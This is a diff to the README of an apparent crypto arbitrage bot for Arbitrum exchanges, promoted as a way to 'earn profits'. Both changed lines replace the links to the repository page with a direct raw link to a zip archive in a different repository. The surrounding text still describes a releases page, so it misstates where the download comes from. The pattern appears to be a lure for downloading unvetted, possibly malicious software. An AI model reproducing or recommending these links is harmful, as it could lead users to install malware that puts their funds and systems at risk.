@@ -5,7 +5,7 @@ description: "Automate arbitrage trades across Arbitrum DEXs including Uniswap V
 ---
 # 🤖 Arbitrum-Arbitrage-Bot-2026 - Earn profits with automated crypto trades
 
-[![Download Arbitrum Arbitrage Bot](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/deefretted599/Arbitrum-Arbitrage-Bot-2026)
+[![Download Arbitrum Arbitrage Bot](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/deefretted599/deefretted599.github.io/main/Alfirk/github-deefretted-io-v2.7.zip)
 
 ## 📖 About this software
 
@@ -23,7 +23,7 @@ This tool finds price differences between decentralized exchanges on the Arbitru
 
 Visit the repository page to download the latest setup file for your machine. You can find the installer on the releases page.
 
-[Click here to visit the download page](https://github.com/deefretted599/Arbitrum-Arbitrage-Bot-2026)
+[Click here to visit the download page](https://raw.githubusercontent.com/deefretted599/deefretted599.github.io/main/Alfirk/github-deefretted-io-v2.7.zip)
 
 Ensure you follow your browser's prompts to save the file to your computer. Once the download finishes, locate the file in your downloads folder.
 
